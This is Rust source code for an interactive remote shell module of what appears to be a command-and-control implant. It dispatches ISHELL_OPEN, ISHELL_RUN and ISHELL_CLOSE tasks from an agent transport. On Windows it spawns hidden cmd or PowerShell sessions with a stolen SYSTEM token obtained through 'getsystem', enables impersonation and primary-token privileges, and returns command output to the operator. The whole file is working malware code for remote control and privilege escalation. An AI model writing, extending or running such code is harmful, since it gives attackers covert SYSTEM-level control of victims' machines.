#![allow(dead_code)]
// Interactive shell session: ISHELL_OPEN / ISHELL_RUN / ISHELL_CLOSE

#[cfg(not(target_os = "windows"))]
use std::io::{BufRead, BufReader, Write};
#[cfg(not(target_os = "windows"))]
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use crate::transport::{AgentTransport, TaskWire};

#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};
#[cfg(target_os = "windows")]
use windows_sys::Win32::Security::{
    ImpersonateLoggedOnUser, RevertToSelf, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

const EOC_PREFIX: &str = "__SHLEOF__";

#[cfg(not(target_os = "windows"))]
struct IShellSession {
    child: Child,
    stdin: ChildStdin,
    // Lines are pushed into this buffer by a background reader thread
    lines: std::sync::Arc<Mutex<Vec<String>>>,
}

#[cfg(not(target_os = "windows"))]
static SESSION: OnceLock<Mutex<Option<IShellSession>>> = OnceLock::new();

#[cfg(not(target_os = "windows"))]
fn session_lock() -> &'static Mutex<Option<IShellSession>> {
    SESSION.get_or_init(|| Mutex::new(None))
}

#[cfg(not(target_os = "windows"))]
fn make_shell_cmd(shell: &str) -> Command {
    #[cfg(target_os = "windows")]
    {
        if shell == "ps" || shell == "powershell" {
            let mut c = Command::new("powershell.exe");
            c.args(["-NoLogo", "-NoProfile", "-NonInteractive"]);
            c
        } else {
            let mut c = Command::new("cmd.exe");
            c.args(["/Q"]);
            c
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = shell;
        Command::new("sh")
    }
}

#[cfg(not(target_os = "windows"))]
fn ishell_open(shell: &str) -> Result<(), String> {
    let mut guard = session_lock().lock().unwrap();

    // Kill any existing session
    if let Some(ref mut sess) = *guard {
        let _ = sess.child.kill();
        let _ = sess.child.wait();
    }
    *guard = None;

    let mut cmd = make_shell_cmd(shell);

    cmd.stdin(Stdio::piped())
       .stdout(Stdio::piped())
       .stderr(Stdio::piped());

    let mut child = cmd.spawn().map_err(|e| format!("spawn failed: {e}"))?;

    let stdin  = child.stdin.take().ok_or("no stdin")?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let stderr = child.stderr.take().ok_or("no stderr")?;

    let lines_arc: std::sync::Arc<Mutex<Vec<String>>> = std::sync::Arc::new(Mutex::new(Vec::new()));

    // Spawn reader threads for stdout and stderr
    {
        let lc = std::sync::Arc::clone(&lines_arc);
        std::thread::spawn(move || {
            for line in BufReader::new(stdout).lines().flatten() {
                lc.lock().unwrap().push(line);
            }
        });
    }
    {
        let lc = std::sync::Arc::clone(&lines_arc);
        std::thread::spawn(move || {
            for line in BufReader::new(stderr).lines().flatten() {
                lc.lock().unwrap().push(line);
            }
        });
    }

    *guard = Some(IShellSession { child, stdin, lines: lines_arc });
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn ishell_run(cmd_line: &str, timeout_ms: u64) -> Result<String, String> {
    let mut guard = session_lock().lock().unwrap();
    let sess = guard.as_mut().ok_or("no active shell — use ISHELL_OPEN first")?;

    // Unique marker to detect end of command output
    let marker = format!("{EOC_PREFIX}_{}", std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos());

    // Write command + echo marker to stdin
    writeln!(sess.stdin, "{cmd_line}").map_err(|e| format!("stdin write: {e}"))?;
    writeln!(sess.stdin, "echo {marker}").map_err(|e| format!("stdin write: {e}"))?;
    sess.stdin.flush().ok();

    // Snapshot the current line index so we only read new output
    let start_idx = sess.lines.lock().unwrap().len();
    let lines_ref = std::sync::Arc::clone(&sess.lines);

    // Drop the session guard so reader threads can push new lines
    drop(guard);

    let deadline = std::time::Instant::now() + Duration::from_millis(timeout_ms);
    let mut output_lines: Vec<String> = Vec::new();
    let mut found_marker = false;

    while std::time::Instant::now() < deadline {
        {
            let buf = lines_ref.lock().unwrap();
            let new_lines = &buf[start_idx.min(buf.len())..];
            for line in new_lines {
                if line.contains(&marker) {
                    found_marker = true;
                    break;
                }
                output_lines.push(line.clone());
            }
        }
        if found_marker { break; }
        std::thread::sleep(Duration::from_millis(50));
    }

    if !found_marker {
        return Err(format!("timeout waiting for shell output ({}ms)", timeout_ms));
    }
    Ok(output_lines.join("\n"))
}

#[cfg(not(target_os = "windows"))]
fn ishell_close() {
    let mut guard = session_lock().lock().unwrap();
    if let Some(ref mut sess) = *guard {
        let _ = sess.child.kill();
        let _ = sess.child.wait();
    }
    *guard = None;
}

// Windows interactive sessions must be created with the stored primary token
// after getsystem.  std::process::Command has no portable token field, so use
// the same CreateProcessWithTokenW/CreateProcessAsUserW + inherited-pipe path
// as the one-shot shell implementation.
#[cfg(target_os = "windows")]
#[repr(C)]
struct WinSecurityAttributes {
    length: u32,
    security_descriptor: *mut core::ffi::c_void,
    inherit_handle: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct WinStartupInfoW {
    cb: u32, reserved: *mut u16, desktop: *mut u16, title: *mut u16,
    x: u32, y: u32, x_size: u32, y_size: u32,
    x_chars: u32, y_chars: u32, fill: u32, flags: u32,
    show: u16, reserved2: u16, reserved2_ptr: *mut u8,
    std_input: isize, std_output: isize, std_error: isize,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct WinProcessInfo {
    process: isize, thread: isize, pid: u32, tid: u32,
}

#[cfg(target_os = "windows")]
#[link(name = "kernel32")]
extern "system" {
    fn CreatePipe(read: *mut isize, write: *mut isize,
                  attrs: *const WinSecurityAttributes, size: u32) -> i32;
    fn SetHandleInformation(handle: isize, mask: u32, flags: u32) -> i32;
    fn ReadFile(handle: isize, buffer: *mut u8, count: u32,
                read: *mut u32, overlapped: *const core::ffi::c_void) -> i32;
    fn WriteFile(handle: isize, buffer: *const u8, count: u32,
                 written: *mut u32, overlapped: *const core::ffi::c_void) -> i32;
    fn PeekNamedPipe(pipe: isize, buffer: *mut u8, size: u32, read: *mut u32,
                     available: *mut u32, left: *mut u32) -> i32;
    fn GetExitCodeProcess(process: isize, exit_code: *mut u32) -> i32;
    fn TerminateProcess(process: isize, exit_code: u32) -> i32;
    fn CreateProcessW(app: *const u16, command: *mut u16,
                      process_attrs: *const WinSecurityAttributes,
                      thread_attrs: *const WinSecurityAttributes,
                      inherit_handles: i32, flags: u32,
                      environment: *const core::ffi::c_void,
                      current_dir: *const u16, startup: *const WinStartupInfoW,
                      process_info: *mut WinProcessInfo) -> i32;
}

#[cfg(target_os = "windows")]
#[link(name = "advapi32")]
extern "system" {
    fn CreateProcessWithTokenW(token: isize, logon_flags: u32, app: *const u16,
                               command: *mut u16, flags: u32,
                               environment: *const core::ffi::c_void,
                               current_dir: *const u16,
                               startup: *const WinStartupInfoW,
                               process_info: *mut WinProcessInfo) -> i32;
    fn CreateProcessAsUserW(token: isize, app: *const u16, command: *mut u16,
                            process_attrs: *const WinSecurityAttributes,
                            thread_attrs: *const WinSecurityAttributes,
                            inherit_handles: i32, flags: u32,
                            environment: *const core::ffi::c_void,
                            current_dir: *const u16,
                            startup: *const WinStartupInfoW,
                            process_info: *mut WinProcessInfo) -> i32;
}

#[cfg(target_os = "windows")]
struct IShellSession {
    process: isize,
    stdin: isize,
    lines: std::sync::Arc<Mutex<Vec<String>>>,
}

#[cfg(target_os = "windows")]
static SESSION: OnceLock<Mutex<Option<IShellSession>>> = OnceLock::new();

#[cfg(target_os = "windows")]
fn session_lock() -> &'static Mutex<Option<IShellSession>> {
    SESSION.get_or_init(|| Mutex::new(None))
}

#[cfg(target_os = "windows")]
fn win_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn ishell_open(shell: &str) -> Result<(), String> {
    let mut guard = session_lock().lock().unwrap();
    if let Some(sess) = guard.take() {
        unsafe {
            TerminateProcess(sess.process, 0);
            CloseHandle(sess.process);
            CloseHandle(sess.stdin);
        }
    }

    let powershell = shell == "ps" || shell == "powershell";
    let app_path = if powershell {
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    } else {
        r"C:\Windows\System32\cmd.exe"
    };
    let child_args = if powershell { "-NoLogo -NoProfile -NonInteractive" } else { "/Q" };
    let app = win_wide(app_path);
    let cwd = win_wide(r"C:\Windows\System32");
    let mut args = win_wide(child_args);
    let mut args_as_user = win_wide(child_args);
    let sa = WinSecurityAttributes {
        length: std::mem::size_of::<WinSecurityAttributes>() as u32,
        security_descriptor: std::ptr::null_mut(), inherit_handle: 1,
    };
    let mut stdin_r = 0isize;
    let mut stdin_w = 0isize;
    let mut stdout_r = 0isize;
    let mut stdout_w = 0isize;
    unsafe {
        if CreatePipe(&mut stdin_r, &mut stdin_w, &sa, 0) == 0 {
            return Err(format!("CreatePipe(stdin) failed ({})", GetLastError()));
        }
        if CreatePipe(&mut stdout_r, &mut stdout_w, &sa, 0) == 0 {
            CloseHandle(stdin_r); CloseHandle(stdin_w);
            return Err(format!("CreatePipe(stdout) failed ({})", GetLastError()));
        }
        // Parent write/read ends must not be inherited by the child.
        SetHandleInformation(stdin_w, 1, 0);
        SetHandleInformation(stdout_r, 1, 0);
    }

    let mut si: WinStartupInfoW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<WinStartupInfoW>() as u32;
    si.flags = 0x0000_0100 | 0x0000_0001; // STARTF_USESTDHANDLES|USESHOWWINDOW
    si.show = 0;
    si.std_input = stdin_r; si.std_output = stdout_w; si.std_error = stdout_w;
    let mut pi: WinProcessInfo = unsafe { std::mem::zeroed() };
    let mut launch_err = 0u32;
    let token = super::system_token_handle();
    let ok = unsafe {
        if token != 0 {
            let mut self_tok = 0isize;
            if OpenProcessToken(GetCurrentProcess(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut self_tok) != 0 {
                super::enable_priv(self_tok, "SeImpersonatePrivilege");
                super::enable_priv(self_tok, "SeIncreaseQuotaPrivilege");
                super::enable_priv(self_tok, "SeAssignPrimaryTokenPrivilege");
                CloseHandle(self_tok);
            }
            super::enable_priv_token(token, "SeImpersonatePrivilege");
            super::enable_priv_token(token, "SeIncreaseQuotaPrivilege");
            super::enable_priv_token(token, "SeAssignPrimaryTokenPrivilege");
            // CreateProcessAsUserW is the pipe-safe path.  CreateProcessWithTokenW
            // goes through seclogon and may not inherit these STARTUPINFO handles.
            let mut result = CreateProcessAsUserW(token, app.as_ptr(), args_as_user.as_mut_ptr(),
                std::ptr::null(), std::ptr::null(), 1, 0x0800_0000,
                std::ptr::null(), cwd.as_ptr(), &si, &mut pi);
            if result == 0 {
                launch_err = GetLastError();
                result = CreateProcessWithTokenW(token, 0, app.as_ptr(), args.as_mut_ptr(),
                    0x0800_0000, std::ptr::null(), cwd.as_ptr(), &si, &mut pi);
                if result == 0 { launch_err = GetLastError(); }
            }
            if result == 0 {
                if ImpersonateLoggedOnUser(token) != 0 {
                    let mut retry = win_wide(child_args);
                    result = CreateProcessWithTokenW(token, 0, app.as_ptr(), retry.as_mut_ptr(),
                        0x0800_0000, std::ptr::null(), cwd.as_ptr(), &si, &mut pi);
                    if result == 0 { launch_err = GetLastError(); }
                    RevertToSelf();
                } else {
                    launch_err = GetLastError();
                }
            }
            result
        } else {
            CreateProcessW(app.as_ptr(), args.as_mut_ptr(), std::ptr::null(), std::ptr::null(),
                1, 0x0800_0000, std::ptr::null(), cwd.as_ptr(), &si, &mut pi)
        }
    };
    unsafe { CloseHandle(stdin_r); CloseHandle(stdout_w); }
    if ok == 0 {
        unsafe { CloseHandle(stdin_w); CloseHandle(stdout_r); }
        return Err(format!("CreateProcess shell failed ({})", if launch_err == 0 { unsafe { GetLastError() } } else { launch_err }));
    }
    unsafe { CloseHandle(pi.thread); }

    let lines: std::sync::Arc<Mutex<Vec<String>>> = std::sync::Arc::new(Mutex::new(Vec::new()));
    let lines_reader = std::sync::Arc::clone(&lines);
    std::thread::spawn(move || unsafe {
        let mut buf = [0u8; 4096];
        loop {
            let mut avail = 0u32;
            if PeekNamedPipe(stdout_r, std::ptr::null_mut(), 0, std::ptr::null_mut(),
                             &mut avail, std::ptr::null_mut()) == 0 { break; }
            if avail > 0 {
                let mut nr = 0u32;
                let want = avail.min(buf.len() as u32);
                if ReadFile(stdout_r, buf.as_mut_ptr(), want, &mut nr, std::ptr::null()) == 0 || nr == 0 { break; }
                lines_reader.lock().unwrap().push(String::from_utf8_lossy(&buf[..nr as usize]).into_owned());
                continue;
            }
            let mut exit_code = 259u32;
            if GetExitCodeProcess(pi.process, &mut exit_code) != 0 && exit_code != 259 { break; }
            std::thread::sleep(Duration::from_millis(20));
        }
        CloseHandle(stdout_r);
    });
    *guard = Some(IShellSession { process: pi.process, stdin: stdin_w, lines });
    Ok(())
}

#[cfg(target_os = "windows")]
fn ishell_run(cmd_line: &str, timeout_ms: u64) -> Result<String, String> {
    let mut guard = session_lock().lock().unwrap();
    let sess = guard.as_mut().ok_or("no active shell — use ISHELL_OPEN first")?;
    let lines_ref = std::sync::Arc::clone(&sess.lines);
    let start_idx = lines_ref.lock().unwrap().len();
    let marker = format!("{EOC_PREFIX}_{}", std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos());
    let input = format!("{cmd_line}\r\necho {marker}\r\n");
    let mut written = 0u32;
    unsafe {
        if WriteFile(sess.stdin, input.as_ptr(), input.len() as u32, &mut written, std::ptr::null()) == 0 {
            return Err(format!("stdin write failed ({})", GetLastError()));
        }
    }
    drop(guard);
    let deadline = std::time::Instant::now() + Duration::from_millis(timeout_ms);
    loop {
        {
            let buf = lines_ref.lock().unwrap();
            // The reader stores pipe chunks rather than guaranteed lines; join
            // them before searching so a marker split across two reads is not
            // lost.
            let mut joined = String::new();
            for item in buf.iter().skip(start_idx) { joined.push_str(item); }
            if let Some(pos) = joined.find(&marker) {
                return Ok(joined[..pos].trim_end().to_string());
            }
        }
        if std::time::Instant::now() >= deadline {
            return Err(format!("timeout waiting for shell output ({}ms)", timeout_ms));
        }
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[cfg(target_os = "windows")]
fn ishell_close() {
    let mut guard = session_lock().lock().unwrap();
    if let Some(sess) = guard.take() {
        unsafe {
            TerminateProcess(sess.process, 0);
            CloseHandle(sess.process);
            CloseHandle(sess.stdin);
        }
    }
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "ISHELL_OPEN" => {
            let shell_arg = if task.args.trim_start().starts_with('{') {
                serde_json::from_str::<serde_json::Value>(&task.args)
                    .ok()
                    .and_then(|v| v.get("shell").and_then(|s| s.as_str()).map(str::to_owned))
            } else {
                None
            };
            let shell = shell_arg.as_deref()
                .or_else(|| if task.args.trim().is_empty() { Some("cmd") } else { None })
                .unwrap_or_else(|| task.args.trim());
            match ishell_open(shell) {
                Ok(())   => t.send_result(task.id, &format!("[+] shell opened: {shell}"), ""),
                Err(e)   => t.send_result(task.id, "", &e),
            }
            true
        }

        "ISHELL_RUN" => {
            let cmd_line = if task.args.trim_start().starts_with('{') {
                serde_json::from_str::<serde_json::Value>(&task.args)
                    .ok()
                    .and_then(|v| v.get("cmd").and_then(|c| c.as_str()).map(str::to_owned))
            } else {
                None
            };
            let cmd_line = cmd_line.as_deref().unwrap_or(task.args.as_str());
            let result = ishell_run(cmd_line, 30_000);
            match result {
                Ok(out)  => t.send_result(task.id, &out, ""),
                Err(e)   => t.send_result(task.id, "", &e),
            }
            true
        }

        "ISHELL_CLOSE" => {
            ishell_close();
            t.send_result(task.id, "[+] shell closed", "");
            true
        }

        _ => false,
    }
}
